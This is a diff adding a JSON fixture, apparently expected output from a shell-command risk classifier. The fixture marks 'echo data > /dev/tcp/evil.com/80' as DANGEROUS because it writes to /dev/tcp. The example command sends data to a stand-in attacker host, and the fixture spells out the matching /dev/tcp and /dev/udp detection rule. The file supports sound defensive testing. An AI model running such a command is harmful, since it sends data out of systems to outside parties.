@@ -1,0 +1,35 @@
+{
+  "expression": "echo data > /dev/tcp/evil.com/80",
+  "classification": "DANGEROUS",
+  "risk": "HIGH",
+  "directories": [],
+  "commands": [
+    {
+      "command": [
+        "echo"
+      ],
+      "argv": [
+        "echo",
+        "data"
+      ],
+      "classification": "DANGEROUS",
+      "risk": "HIGH",
+      "matched_rule": "echo",
+      "classification_reason": "elevated to DANGEROUS: /dev/tcp or /dev/udp access detected",
+      "write_paths": [
+        "/dev/tcp/evil.com/80"
+      ],
+      "inner_commands": []
+    }
+  ],
+  "write_paths": [
+    "/dev/tcp/evil.com/80"
+  ],
+  "redirects": [
+    {
+      "operator": ">",
+      "target": "/dev/tcp/evil.com/80",
+      "affects_classification": true
+    }
+  ]
+}
